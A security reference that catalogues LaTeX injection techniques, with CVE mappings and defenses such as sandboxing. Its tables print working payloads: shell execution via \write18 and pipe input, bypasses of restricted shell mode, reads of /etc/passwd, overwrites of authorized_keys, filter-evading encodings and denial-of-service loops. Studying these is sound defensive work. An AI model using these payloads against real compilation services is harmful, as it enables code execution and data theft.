# LaTeX Injection Mutation/Variation Taxonomy

---
## Classification Structure

LaTeX injection exploits the fundamental design of TeX as a **Turing-complete programming language** masquerading as a document typesetting system. Because TeX provides unrestricted file I/O, macro expansion, and — in many configurations — shell command execution, any system that compiles user-controlled LaTeX input inherits the full attack surface of an arbitrary code execution environment.


**Axis 1 — Mutation Target (Primary):** The structural primitive or engine feature being exploited. This determines *what mechanism* the attacker leverages. Categories include command execution primitives, file I/O operations, engine-specific features (LuaTeX, XeTeX), filter/sandbox evasion mechanisms, resource consumption vectors, and output channel manipulation.

**Axis 2 — Security Boundary Violated (Cross-cutting):** The type of protection that each mutation circumvents. This explains *why* the mutation succeeds in a given deployment.

| Boundary Type | Description |
|---|---|
| **No-shell-escape bypass** | Executing commands despite `--no-shell-escape` configuration |
| **Restricted-shell-escape bypass** | Abusing whitelisted commands to achieve arbitrary execution |
| **Filter/blocklist evasion** | Circumventing regex or keyword-based input sanitization |
| **Sandbox escape** | Breaking out of containerized or chroot-jailed compilation environments |
| **Trust boundary violation** | Exploiting implicit trust in `.sty`/`.cls` files or compilation pipelines |

**Axis 3 — Attack Scenario (Mapping):** The deployment architecture in which each mutation becomes weaponizable. Covered in §8.

### Foundational Mechanism

TeX was designed for local document compilation. Three properties are relevant to injection:

1. **Turing completeness**: TeX supports loops, conditionals, recursion, and macro expansion — sufficient to implement any algorithm, including exploit logic.
2. **Unrestricted file I/O by default**: `\openin`, `\openout`, `\read`, `\write` operate on the host filesystem with the privileges of the compilation process.
3. **Shell bridge via `\write18`**: When enabled, provides direct OS command execution. Even when disabled, multiple bypass paths exist through engine-specific features and whitelisted program abuse.

---

## §1. Command Execution Primitives

The most direct attack vector: executing arbitrary OS commands through TeX's built-in shell interface or equivalent mechanisms.

### §1-1. Direct Shell Execution via `\write18`

The `\write18{command}` primitive writes to file descriptor 18, which is mapped to the system shell. When `--shell-escape` is enabled, this provides unrestricted command execution.

| Subtype | Mechanism | Example |
|---|---|---|
| **Basic `\write18`** | Direct shell command invocation | `\immediate\write18{id > /tmp/out}` |
| **Deferred `\write18`** | Command executes at page shipout, not immediately | `\write18{id > /tmp/out}` |
| **`\immediate` prefix** | Forces synchronous execution before continuing compilation | `\immediate\write18{env \| base64 > out.tex}` |
| **Chained output capture** | Execute command, redirect to file, then `\input` the result | `\immediate\write18{cat /etc/passwd > r.tex}\input{r.tex}` |
| **Base64 encoding for clean output** | Encodes command output to avoid TeX special character errors | `\immediate\write18{env \| base64 > test.tex}\input{test.tex}` |

**Key Condition:** Requires `--shell-escape` flag or `shell_escape=t` in `texmf.cnf`. This is the most commonly documented but also most commonly restricted vector.

### §1-2. Pipe Input Execution

The `\input` command supports pipe syntax on some engines, allowing command execution without explicit `\write18`.

| Subtype | Mechanism | Example |
|---|---|---|
| **Basic pipe input** | Command output fed directly as TeX input | `\input\|ls\|base64` |
| **Quoted pipe syntax** | Alternative quoting for command arguments using pipe operator | `\input|"hostname"` (note: pipe syntax uses `\input|"cmd"`, NOT `\input{"cmd"}` — the `{}` form is the file-path form, not the pipe-execution form) |
| **IFS space bypass** | Uses `${IFS}` to substitute spaces in command arguments | `\input\|uname${IFS}-a\|base64` |
| **Base64 command decode** | Encodes entire command in base64 to bypass filters | `\input\|echo${IFS}aWQ=\|base64${IFS}-d\|bash` |

**Key Condition:** Same shell-escape requirements as §1-1. Pipe input is an alternative syntax reaching the same underlying execution path.

### §1-3. Restricted Shell Escape Abuse

When `--shell-restricted` mode is active, only whitelisted programs (defined in `shell_escape_commands`) may be invoked via `\write18`. However, several whitelisted programs contain features that enable arbitrary command execution.

| Subtype | Mechanism | Example |
|---|---|---|
| **`mpost -tex` injection** | MetaPost's `-tex` parameter specifies which TeX processor handles text labels; accepts arbitrary commands | `\immediate\write18{mpost -ini "-tex=bash -c (id)>/tmp/pwn" x.mp}` |
| **`mpost` with IFS bypass** | Uses `${IFS}` to inject spaces in the `-tex` parameter | `\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}` |
| **`mpost` via base64** | Encodes payload to avoid character restrictions | `mpost -ini '-tex=bash -c (base64${IFS}-d<<<aWQ=\|bash)' f.txt` |
| **`epstopdf` pipe exploitation** | GhostScript's pipe features enable command execution through EPS conversion | `\immediate\write18{epstopdf --gsopt=-dSAFER=false malicious.eps}` |
| **`repstopdf` directory traversal** | Overwrites files in dot-directories (e.g., `.ssh/authorized_keys`) when run from home directory | Path traversal via `repstopdf` output path |
| **`bibtex8` / `kpsewhich` info leak** | Whitelisted utilities that leak version/path information | `\input{"\|bibtex8 --version > /tmp/b.tex"}` |

**Key Condition:** Requires `--shell-restricted` (or `shell_escape=p`). The fundamental flaw is that whitelisted programs were assumed to have "no features to invoke arbitrary other programs" — an assumption violated by `mpost`'s `-tex` parameter.

### §1-4. Engine-Specific Command Execution

Different TeX engines have unique command execution paths that bypass standard `\write18` restrictions.

| Subtype | Mechanism | Example |
|---|---|---|
| **LuaTeX `io.popen` via `debug.getupvalue`** | Exploits Lua's debug library to extract the original unrestricted `io.popen` from the security wrapper's closure (CVE-2023-32700) | `debug.getupvalue(io.popen, 1)` then call directly |
| **LuaTeX `os.execute` remnants** | In older versions, `os.execute` was not fully disabled in restricted mode | Direct Lua `os.execute("command")` |
| **LuaTeX `package.loaded.debug` bypass** | Even with `--safer` setting `debug=nil`, the module remains accessible via `package.loaded.debug` | `package.loaded.debug.getupvalue(...)` |

**Key Condition:** LuaTeX versions 1.04–1.16.1 (TeX Live 2017–2022). Fixed in LuaTeX 1.17.0 by reimplementing the `io.popen` wrapper in C rather than Lua. Affects **all** shell-escape modes including `--no-shell-escape`.

---

## §2. File Read Primitives

Reading arbitrary files from the host filesystem. These techniques work even with `--no-shell-escape` in most configurations, as file I/O is a core TeX capability.

### §2-1. TeX-Native File Input Commands

| Subtype | Mechanism | Example |
|---|---|---|
| **`\input` file inclusion** | Interprets file content as TeX code; breaks on special characters | `\input{/etc/passwd}` |
| **`\include` file inclusion** | Similar to `\input` but restricted to `.tex` extension files and adds page breaks | `\include{secret}` (reads `secret.tex`) |
| **`\@@input` internal primitive** | LaTeX internal that bypasses some `\input` wrappers | `\makeatletter\@@input\|"command"` |
| **`\@input` variant** | Alternative internal input command | `\makeatletter\@input{/etc/passwd}` |

**Limitation:** `\input` interprets content as TeX, so files containing `$`, `#`, `&`, `_`, `{`, `}` or `\` will cause errors or misinterpretation. This makes it unreliable for binary or code files.

### §2-2. Literal/Verbatim File Reading

Commands that read file content without TeX interpretation, producing faithful reproductions.

| Subtype | Mechanism | Example |
|---|---|---|
| **`\lstinputlisting`** | From the `listings` package; reads files literally with optional syntax highlighting | `\usepackage{listings}\lstinputlisting{/etc/passwd}` |
| **`\verbatiminput`** | From the `verbatim` package; outputs file content in monospace, uninterpreted | `\usepackage{verbatim}\verbatiminput{/etc/passwd}` |
| **`\VerbatimInput`** | From the `fancyvrb` package; enhanced verbatim with formatting options | `\usepackage{fancyvrb}\VerbatimInput{/etc/passwd}` |
| **Catcode neutralization** | Changes category codes of special characters to "other" (12) before `\input`, preventing TeX interpretation | `\catcode`\$=12 \catcode`\#=12 \input{script.pl}` |

**Key Condition:** Package-based methods require the relevant package to be available. The catcode approach is universal but requires knowing which special characters to neutralize. The `\verbatiminput` bypass of Anki's blocklist (CVE-2024-29073) demonstrates that blocklists consistently miss alternative reading commands.

### §2-3. Low-Level File I/O Primitives

Direct stream-based file reading using TeX's file handle system.

| Subtype | Mechanism | Example |
|---|---|---|
| **Single-line read** | Opens a file stream and reads the first line | `\newread\file \openin\file=/etc/issue \read\file to\line \line \closein\file` |
| **Multi-line loop read** | Iterates through all lines using `\loop..\repeat` | `\newread\file \openin\file=/etc/passwd \loop\unless\ifeof\file \read\file to\line \line \repeat \closein\file` |
| **Recursive read** | Uses recursive macro instead of `\loop` to avoid loop-keyword filters | `\def\r{\ifeof\file\else\read\file to\line\line\r\fi}` then `\openin\file=target \r` |
| **Custom loop with counter** | Defines a counted loop macro to read N lines | `\renewcommand\l[2]{\ifnum#1>0 #2\l{\numexpr#1-1\relax}{#2}\fi}` |

**Key Condition:** Works with `--no-shell-escape`. The `\openin`/`\read`/`\closein` primitives are always available in TeX. Recursive variants bypass filters that block the `\repeat` keyword.

### §2-4. Binary File Embedding via PDF Streams

For binary files that cannot be read as text, pdfTeX provides primitives to embed arbitrary files as PDF stream objects.

| Subtype | Mechanism | Example |
|---|---|---|
| **`\pdfobj stream file`** | Embeds an arbitrary binary file as a PDF stream object | `\immediate\pdfobj stream attr{/Type /EmbeddedFile} file{/etc/shadow}` |
| **Stream ID recovery** | The embedded stream can be extracted from the PDF using its object ID | `\the\pdflastobj` prints the stream object number |

**Key Condition:** pdfTeX-specific (`\pdfobj` is not available in XeTeX or LuaTeX). Extraction requires post-processing the PDF with tools like `mutool`. This technique is particularly useful for exfiltrating binary files (SSH keys, database files, certificates) that cannot be rendered as text.

---

## §3. File Write Primitives

Writing arbitrary content to the host filesystem. Combined with other techniques, this enables multi-stage attacks.

### §3-1. TeX-Native File Output

| Subtype | Mechanism | Example |
|---|---|---|
| **Basic `\openout`/`\write`** | Opens a file for writing and outputs content | `\newwrite\file \openout\file=evil.tex \write\file{payload} \closeout\file` |
| **Immediate write** | Forces synchronous write operation | `\immediate\openout\file=cmd.tex \immediate\write\file{content} \immediate\closeout\file` |
| **Overwrite sensitive files** | Targets configuration files, authorized_keys, crontabs | `\openout\file=../.ssh/authorized_keys` |
| **Multi-pass payload staging** | First pass writes exploit code to a `.tex` file; second pass executes it via `\input` | Write `\immediate\write18{cmd}` to file, then `\input{file}` on recompilation |

**Key Condition:** File write is always available in TeX (not restricted by shell-escape settings). Write paths are relative to the compilation directory unless absolute paths are used. MiKTeX on Windows historically placed no restrictions on output paths.

---

## §4. Filter and Blocklist Evasion

When web services or applications attempt to sanitize LaTeX input by blocking dangerous commands, the extraordinary malleability of TeX syntax provides numerous bypass paths.

### §4-1. Character Code Manipulation (`\catcode`)

TeX's category code system assigns a semantic role to each character. By reassigning category codes, any character can take on the role of any other, rendering keyword-based filters ineffective.

| Subtype | Mechanism | Example |
|---|---|---|
| **Escape character reassignment** | Changes an arbitrary character (e.g., `X`) to category 0 (escape), replacing `\` | `\catcode`X=0 Xinput{/etc/passwd}` |
| **Superscript code for hex encoding** | Assigns category 7 (superscript) to a character, enabling `^^XX` hex escape encoding | `\catcode`\@=7 \in@@70ut{/etc/passwd}` (@@70 = `p`) |
| **Special character neutralization** | Changes `$`, `#`, `_`, `&` to category 12 (other), allowing safe reading of source code files | `\catcode`\$=12 \catcode`\#=12 \input{script.py}` |

**Why It Works:** Filters operate on the *textual* representation of input. TeX's `\catcode` system transforms character semantics *before* command parsing, so the filter sees `Xinput` (harmless) while TeX interprets it as `\input` (dangerous).

### §4-2. Hex Escape Sequences (`^^XX`)

TeX's `^^` notation allows any character to be represented by its hexadecimal code point. This applies at the tokenizer level — before any macro expansion or command lookup.

| Subtype | Mechanism | Example |
|---|---|---|
| **Single character substitution** | Replace one filtered character with its hex code | `\lstin^^70utlisting{/etc/passwd}` (`^^70` = `p`) |
| **Full command encoding** | Encode an entire command character-by-character | `^^5c^^69^^6e^^70^^75^^74{/etc/passwd}` = `\input{/etc/passwd}` |
| **Combined with catcode** | Reassign superscript character to enable `^^` with alternate delimiters | `\catcode`X=7 XX5cinput{/etc/passwd}` |

**Why It Works:** The `^^XX` substitution occurs at TeX's lowest lexical level (character input processing), before the tokenizer even begins to identify control sequences. No amount of regex filtering on the input string can catch a payload that doesn't contain its target characters until after TeX-level processing.

### §4-3. Control Sequence Name Construction (`\csname`)

TeX's `\csname...\endcsname` construct builds a control sequence name from arbitrary tokens, including those that would not normally form a valid command name.

| Subtype | Mechanism | Example |
|---|---|---|
| **Backslash-free command invocation** | Constructs a command name without using `\` before it | `\csname input\endcsname{/etc/passwd}` |
| **Dynamic command construction** | Builds command name from string fragments | `\csname inp\endcsname{\csname ut\endcsname}` (with appropriate definitions) |

**Why It Works:** Filters that look for `\input`, `\write18`, or similar backslash-prefixed commands will not match `\csname input\endcsname`, even though they execute identically.

### §4-4. Macro Definition Obfuscation (`\def`)

TeX macros enable arbitrary string manipulation. By defining macros that expand to fragments of dangerous commands, an attacker can construct exploit payloads from innocuous-looking components.

| Subtype | Mechanism | Example |
|---|---|---|
| **Split-definition reassembly** | Defines separate macros for fragments, then concatenates them | `\def\a{inp} \def\b{ut} \csname\a\b\endcsname{/etc/passwd}` |
| **String escaping via `\string`** | Uses `\string` to produce literal backslash characters in macro output | `\def\cmd{\string\write\string18{ls}}` |
| **Multi-pass file staging** | First pass writes obfuscated payload to a `.tex` file using macros; second pass executes the deobfuscated result | Write `\def\imm{\string\immediate}...` to file, compile twice |
| **Immediate file staging (single-pass)** | Uses `\immediate\openout` and `\immediate\write` with `\string` to create and execute payload in one pass | `\immediate\openout\f=cmd.tex \immediate\write\f{\string\immediate\string\write18{id}} \immediate\closeout\f \input{cmd.tex}` |

**Why It Works:** The attack payload exists in distributed, individually harmless fragments until macro expansion assembles them. Static analysis of the input will not find any complete dangerous command.

### §4-5. `\begin`/`\end` Environment Abuse

LaTeX's environment mechanism calls `\commandname` when `\begin{commandname}` is used. This provides yet another way to invoke arbitrary commands without explicit backslash-command syntax.

| Subtype | Mechanism | Example |
|---|---|---|
| **Environment-wrapped command** | `\begin{X}` internally calls `\X`, so `\begin{input}` calls `\input` | `\begin{input}{\|"id > /tmp/pwn"}\end{input}` |
| **Nested environments** | Chain environments to build complex payloads | Combination of `\begin{lstinputlisting}` with path argument |

**Why It Works:** Filters blocking `\input` may not block `\begin{input}`, because the filter model doesn't account for LaTeX's environment dispatch mechanism.

### §4-6. Blocklist Incompleteness

Even well-intentioned blocklists systematically miss commands due to the vast number of TeX/LaTeX primitives and package commands that can read, write, or execute.

| Subtype | Mechanism | Example |
|---|---|---|
| **Overlooked package commands** | Blocklist covers `\input`, `\include`, `\write18` but misses `\verbatiminput`, `\lstinputlisting`, `\VerbatimInput` | CVE-2024-29073: Anki blocked `\input`/`\include` but missed `\verbatiminput` |
| **Internal LaTeX commands** | `\makeatletter` exposes `\@input`, `\@@input`, `\@iinput` — internal variants not in blocklists | `\makeatletter\@@input\|"id"` |
| **Alternative loop constructs** | Blocking `\loop`/`\repeat` doesn't prevent recursive macros | `\def\r{\ifeof\f\else\read\f to\l\l\r\fi}` |
| **Package-provided execution** | Some packages provide their own command execution or file I/O mechanisms | Various packages with system interaction features |

**Why It Works:** TeX/LaTeX has thousands of commands across hundreds of packages. Any finite blocklist can be circumvented by discovering an unlisted alternative that provides equivalent functionality.

---

## §5. Engine-Specific Attack Surfaces

Different TeX engines (pdfTeX, LuaTeX, XeTeX) have distinct architectures that create unique vulnerability classes.

### §5-1. LuaTeX: Lua Runtime Exploitation

LuaTeX embeds a full Lua interpreter, dramatically expanding the attack surface beyond traditional TeX primitives.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`debug.getupvalue` shell escape bypass** | Extracts the original `io.popen` from the security wrapper's closure, bypassing all shell-escape restrictions (CVE-2023-32700) | LuaTeX 1.04–1.16.1; affects `--no-shell-escape` mode |
| **`luasocket` network access** | Default-enabled socket library allows arbitrary HTTP requests, data upload/download (CVE-2023-32668) | LuaTeX 0.27.0–1.16.2; sockets enabled by default |
| **`package.loaded.debug` persistence** | `--safer` sets `debug=nil` but doesn't remove it from `package.loaded`, allowing recovery | All LuaTeX versions before the fix |
| **Lua `io` library file access** | Lua's `io.open`/`io.read`/`io.write` provide file access independent of TeX primitives | Available unless `--safer` mode is used |
| **Lua `os` library remnants** | Some `os.*` functions remain accessible in restricted modes | Version-dependent |

**Architectural Significance:** LuaTeX's embedding of a general-purpose scripting language means its attack surface is the *union* of TeX's attack surface and Lua's attack surface. The CVE-2023-32700 vulnerability is particularly severe because it affects documents compiled with **default security settings** (no shell escape), undermining the primary mitigation that most deployments rely on.

### §5-2. LuaTeX: Network-Based Attacks

The `luasocket` library (enabled by default until v1.17.0) enables network operations from within a document.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Data exfiltration via HTTP** | Reads local files and sends content to attacker-controlled server | `luasocket` available (pre-1.17.0 default) |
| **Reverse shell** | Establishes a network connection back to attacker for interactive shell | Requires both socket and command execution |
| **SSRF from compilation server** | Document triggers HTTP requests to internal services from the compilation server's network position | Web-based LaTeX service compiling with LuaTeX |
| **Malicious file download** | Downloads and writes files to the local filesystem | Socket + file write capabilities |

### §5-3. pdfTeX-Specific Features

pdfTeX provides PDF-manipulation primitives that create unique attack vectors.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`\pdfobj stream file` embedding** | Embeds arbitrary binary files as PDF stream objects for later extraction | pdfTeX only; no shell-escape required |
| **PDF metadata manipulation** | Injects attacker-controlled content into PDF metadata fields | Any pdfTeX compilation |
| **`\pdfliteral` injection** | Injects raw PDF operators into the output stream | pdfTeX only |

---

## §6. Denial of Service and Resource Exhaustion

TeX's Turing completeness means any document can consume unbounded CPU, memory, or disk resources.

### §6-1. Infinite Loop Constructs

| Subtype | Mechanism | Example |
|---|---|---|
| **`\loop\iftrue\repeat`** | Simplest infinite loop using TeX's built-in loop construct | `\loop\iftrue\repeat` |
| **Recursive macro bomb** | Self-calling macro with no termination condition | `\def\nothing{\nothing}\nothing` |
| **Mutual recursion** | Two macros calling each other indefinitely | `\def\a{\b}\def\b{\a}\a` |
| **Counter overflow loop** | Infinite loop via `\loop...\iftrue...\repeat` — the `\iftrue` ensures the loop body always repeats. Note: `\loop...\repeat` **requires a conditional** (`\ifnum`, `\iftrue`, etc.) between `\loop` and `\repeat`; without one TeX produces a syntax error | `\newcount\c\loop\advance\c by 1\iftrue\repeat` |

**Key Condition:** Works with `--no-shell-escape`. Even previewers that disable most TeX features are vulnerable if they allow `\loop`, `\def`, or `\newcommand`.

### §6-2. Memory and Expansion Bombs

| Subtype | Mechanism | Example |
|---|---|---|
| **Exponential macro expansion** | Defines macros that double in size with each expansion level | `\def\a{XX}\def\b{\a\a}\def\c{\b\b}...\z` |
| **String pool exhaustion** | Creates extremely long token lists that exhaust TeX's string pool | Deep nesting of `\edef` with expanding content |
| **Hash table flooding** | Defines a very large number of control sequences | Loop generating `\csname unique_N\endcsname` for large N |
| **Font metric exhaustion** | Requests loading of extremely large or numerous font files | `\font\f=file at 1000pt` (extreme scaling) |

### §6-3. Disk-Based Resource Exhaustion

| Subtype | Mechanism | Example |
|---|---|---|
| **Large file generation** | Writes enormous output files via `\openout`/`\write` in a loop | Loop writing megabytes of data to output file |
| **Temporary file flooding** | Creates thousands of temporary files | Loop with `\openout` to unique filenames |
| **Auxiliary file amplification** | Generates `.aux`, `.toc`, `.lof`, `.lot` files of extreme size | Thousands of `\label`, `\tableofcontents` entries |

---

## §7. Cross-Site Scripting (XSS) via LaTeX Rendering

When LaTeX output is embedded in web pages — particularly through math rendering libraries — XSS injection becomes possible.

### §7-1. Direct XSS Through LaTeX Commands

| Subtype | Mechanism | Example |
|---|---|---|
| **`\url` javascript protocol** | URL commands may not sanitize the protocol scheme | `\url{javascript:alert(1)}` |
| **`\href` javascript protocol** | Hyperlink command with JavaScript payload | `\href{javascript:alert(1)}{click}` |

### §7-2. Math Rendering Library Vulnerabilities

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **MathJax `\unicode` macro XSS** | The `\unicode{}` macro in older MathJax versions allowed HTML injection (CVE-2018-1999024) | MathJax versions before the fix |
| **KaTeX error message XSS** | Error messages from invalid LaTeX were not properly escaped, allowing script injection | `markdown-it-katex` and similar wrappers |
| **`markdown-it-texmath` XSS** | Insufficient validation in the math delimiter parser allowed JavaScript injection | Affected versions of `markdown-it-texmath` |
| **Indico LaTeX math rendering XSS** | LaTeX math code in contribution/abstract descriptions not properly sanitized (CVE-2025-59035) | Indico before 3.3.8 |

### §7-3. PDF-Embedded JavaScript

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **JavaScript in PDF annotations** | LaTeX can create PDF annotations containing JavaScript that executes when the PDF is opened | PDF viewer supports JavaScript execution |
| **Form field scripting** | PDF form fields created via LaTeX packages (e.g., `hyperref`) can contain executable JavaScript | Requires packages supporting PDF forms |

---

## §8. Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Risk Level |
|---|---|---|---|
| **Web-based LaTeX compilation service** | User submits `.tex` source; server compiles to PDF | §1 (RCE), §2 (file read), §5-1/§5-2 (LuaTeX), §6 (DoS) | **Critical** — attacker has full access to compilation server |
| **Collaborative LaTeX editor** | Multi-user platform (Overleaf, Papeeria) with shared compilation | §1, §2, §3, §5, §6 | **Critical** — lateral movement between user projects possible |
| **Document generation pipeline** | Application generates LaTeX from user input (invoices, reports, certificates) | §4 (filter evasion) → §1/§2 | **High** — partial LaTeX injection through template interpolation |
| **Math rendering in web apps** | Server-side LaTeX-to-image/SVG conversion for math formulas | §2 (file read), §6 (DoS), §7 (XSS) | **High** — formulas are often user-controlled |
| **Academic submission system** | Authors submit `.tex`/`.sty` files for peer review | §3-1 (trojan style files), §1, §2, §5 | **High** — exploits trust in "text-only" files |
| **Desktop compilation (local)** | User compiles downloaded `.tex` files locally | §1, §2, §3, §3-1 (virus), §5-1 | **Medium** — requires social engineering |
| **Flashcard / learning apps** | Apps compile LaTeX snippets for math display (e.g., Anki) | §2 (file read via §4-6 blocklist bypass), §7 (XSS) | **Medium** — CVE-2024-29073 |
| **CI/CD documentation build** | Automated LaTeX compilation in build pipelines | §1, §2, §5 | **High** — access to CI secrets and build infrastructure |

---

## §9. Data Exfiltration Channels

Beyond direct file reading, attackers in restricted environments need methods to extract data from the compilation server.

### §9-1. In-Band Exfiltration (Via PDF Output)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Rendered text in PDF** | File content displayed as visible text in the output document | Attacker retrieves the compiled PDF |
| **PDF stream object embedding** | Binary files embedded as PDF stream objects (§2-4) | pdfTeX; requires PDF post-processing to extract |
| **PDF metadata channels** | Data hidden in PDF metadata fields (Author, Subject, Keywords, custom fields) | Any TeX engine producing PDF |
| **Steganographic embedding** | Data encoded into visual elements (invisible text, white-on-white, micro-scaled) | Attacker can analyze PDF structure |

### §9-2. Out-of-Band Exfiltration

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`\write18` + `curl`/`wget`** | Shell command sends data to attacker server | Shell-escape enabled |
| **LuaTeX socket exfiltration** | Lua's socket library sends HTTP requests with file content | LuaTeX with sockets enabled (§5-2) |
| **DNS exfiltration** | Encodes data in DNS queries via shell commands | Shell-escape + DNS resolution from server |
| **Compilation error messages** | Intentional errors that include sensitive data in error output visible to the user | Error output is returned to the submitting user |
| **Log file leakage** | Sensitive data written to `.log` files accessible to the user | Log files returned alongside PDF output |

---

## §10. CVE / Real-World Incident Mapping

| Mutation Combination | CVE / Case | Impact |
|---|---|---|
| §5-1 (LuaTeX `debug.getupvalue` bypass) | CVE-2023-32700 | **Critical.** Arbitrary shell command execution on any LuaTeX 1.04–1.16.1 document, even with `--no-shell-escape`. Affects TeX Live 2017–2022 |
| §5-2 (LuaTeX socket default-enabled) | CVE-2023-32668 | **High.** Arbitrary network requests from compiled documents. LuaTeX 0.27.0–1.16.2 (TeX Live 2009–2023, MiKTeX 2.9.0–23.4) |
| §4-6 (Blocklist incompleteness — `\verbatiminput`) | CVE-2024-29073 | **Medium.** Arbitrary file read in Anki 24.04 via overlooked `verbatim` package command. Shared flashcards as attack vector |
| §7-2 (MathJax `\unicode` XSS) | CVE-2018-1999024 | **Medium.** JavaScript execution in browsers rendering MathJax content via crafted `\unicode{}` macro |
| §7-2 (Indico LaTeX math XSS) | CVE-2025-59035 | **Medium.** XSS through LaTeX math code in Indico contribution descriptions. Fixed in Indico 3.3.8 |
| Overleaf aspell path traversal | CVE-2024-45312 | **Medium.** Arbitrary file path in aspell dictionary loading in Overleaf CE/SP < 5.0.7 |
| §2 + §9-2 (File read + exfiltration) | Indico LaTeX advisory (GHSA-67cx-rhhq-mfhq) | **High.** Local file disclosure through LaTeX sanitization bypass in Indico |
| §1 (Direct RCE) | Tea LaTeX 1.0 (EDB-48805) | **Critical.** Unauthenticated RCE in Tea LaTeX web application |
| §1 + §2 + §5 (Multiple vectors on online services) | "Can You Accept LaTeX Files" (2021 study) | **High.** Most online LaTeX services vulnerable to information disclosure; only sandboxed services were resistant |
| §1-3 (`mpost -tex` restricted escape bypass) | TeX Live restricted shell escape | **High.** Arbitrary command execution despite restricted shell mode via `mpost`'s `-tex` parameter |

---

## §11. Detection and Defense Tools

| Tool / Approach | Type | Core Technique |
|---|---|---|
| **`--no-shell-escape` flag** | Engine configuration | Disables `\write18` and pipe input; primary defense but bypassable via engine bugs (§5-1) |
| **`--shell-restricted` mode** | Engine configuration | Limits `\write18` to whitelisted commands; bypassable via whitelisted program abuse (§1-3) |
| **`--safer` mode (LuaTeX)** | Engine configuration | Disables Lua I/O and debug libraries; breaks font loading; has bypass via `package.loaded` |
| **Docker/container sandboxing** | Infrastructure | Isolates compilation in ephemeral containers; most effective defense — limits blast radius of all techniques |
| **seccomp / AppArmor profiles** | OS-level | Restricts system calls available to the TeX process; prevents shell execution and network access |
| **`openin_any` / `openout_any` config** | TeX configuration | Controls file I/O scope: `a` (any), `r` (restricted to subtree), `p` (paranoid — no dotfiles) |
| **Secure Plain TeX** | Reimplementation | A restricted TeX subset that only allows typesetting control sequences; eliminates I/O and shell access |
| **Input sanitization (blocklist)** | Application-level | Regex/keyword blocking of dangerous commands; fundamentally unreliable due to §4 evasion techniques |
| **Input sanitization (allowlist)** | Application-level | Only permits a predefined set of safe commands; more robust than blocklist but restrictive for users |
| **PayloadsAllTheThings LaTeX Injection** | Payload repository | Reference collection of LaTeX injection payloads for testing |
| **Compilation timeout + resource limits** | Infrastructure | `ulimit`, cgroups, or container resource limits to mitigate §6 DoS attacks |

---

## §12. Summary: Core Principles

### The Root Cause

LaTeX injection exists because TeX was designed as a **local, trusted, single-user programming environment** that happens to produce typeset documents. Its file I/O, macro system, and shell interface were features, not bugs, in the 1978 context of their creation. The security crisis arises from deploying this 1978 trust model in 2025 contexts: multi-tenant web services, untrusted user input, and network-connected compilation servers.

### Why Incremental Fixes Fail

Every mitigation attempted at the TeX level has been systematically circumvented:

1. **`--no-shell-escape`** was bypassed by LuaTeX's `debug.getupvalue` (CVE-2023-32700), and file I/O remains unrestricted.
2. **`--shell-restricted`** was bypassed by `mpost -tex` injection and `epstopdf` pipe features.
3. **Command blocklists** are defeated by `\catcode` manipulation, `^^XX` hex encoding, `\csname` construction, `\def` obfuscation, and `\begin`/`\end` environment dispatch — any one of which is sufficient to evade any finite blocklist.
4. **Package blocklists** cannot keep pace with the thousands of LaTeX packages that provide file I/O or system interaction features.

The fundamental problem is that **TeX's Turing completeness makes any subset restriction undecidable**. You cannot, in general, determine whether a given TeX program will execute a dangerous operation without actually running it — and running untrusted code is precisely what these mitigations are trying to prevent.

### The Structural Solution

Effective isolation combines:

1. **Container sandboxing**: Compile every document in an ephemeral, network-isolated container with minimal filesystem access. This is the approach used by well-secured services like Overleaf (Docker) and Papeeria (per-compilation containers).
2. **Resource limits**: Enforce CPU time, memory, and disk quotas to mitigate denial of service.
3. **Minimal engine configuration**: Use `--no-shell-escape` (still valuable against casual attacks), restrictive `openin_any`/`openout_any` settings, and up-to-date engine versions.
4. **Output sanitization**: Validate and sanitize compiled PDF output before serving to prevent XSS and embedded JavaScript execution.
5. **Avoid LaTeX for untrusted input entirely**: Where possible, use restricted alternatives (MathJax client-side, KaTeX) instead of full server-side LaTeX compilation for user-controlled math content.

The lesson of LaTeX injection is a general one: **Turing-complete document formats cannot be safely processed from untrusted sources without process-level isolation.** The same principle applies to PostScript, Microsoft Office macros, and any other "document" format that is secretly a programming language.

---

## References

- Checkoway, S., Shacham, H., & Rescorla, E. (2010). *Don't take LaTeX files from strangers.* ;login: USENIX Magazine.
- Lacombe, G., Masalygina, K., Tahiri, A., Adam, C., & Lauradoux, C. (2021). *Can You Accept LaTeX Files from Strangers? Ten Years Later.* arXiv:2102.00856.
- [Chernoff, M. (2023). *LuaTeX Security Vulnerabilities.*](https://www.maxchernoff.ca/p/luatex-vulnerabilities)
- CVE-2023-32700: LuaTeX arbitrary shell command execution via debug.getupvalue.
- CVE-2023-32668: LuaTeX luasocket default-enabled network access.
- CVE-2024-29073: Anki LaTeX incomplete blocklist (verbatiminput bypass).
- CVE-2024-45312: Overleaf aspell dictionary path manipulation.
- CVE-2025-59035: Indico XSS via LaTeX math rendering.
- CVE-2018-1999024: MathJax XSS via \unicode macro.
- [PayloadsAllTheThings — LaTeX Injection.](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/)
- [Practical CTF — LaTeX.](https://book.jorianwoltjer.com/languages/latex)
- [HackTricks — Formula/CSV/Doc/LaTeX/GhostScript Injection.](https://book.hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html)
- [scumjr (2016). *Pwning coworkers thanks to LaTeX.*](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
- [0day.work. *Hacking with LaTeX.*](https://0day.work/hacking-with-latex/)
- [sk3rts.rocks. *Bypassing LaTeX Filters.*](https://sk3rts.rocks/posts/bypassing-latex-filters/)
- Talos Intelligence. TALOS-2024-1992 (Anki LaTeX vulnerability).
- Exploit Database. EDB-48805 (Tea LaTeX 1.0 RCE).
- OWASP ASVS Issue #1559: Add LaTeX injection to Formula Injection checks.
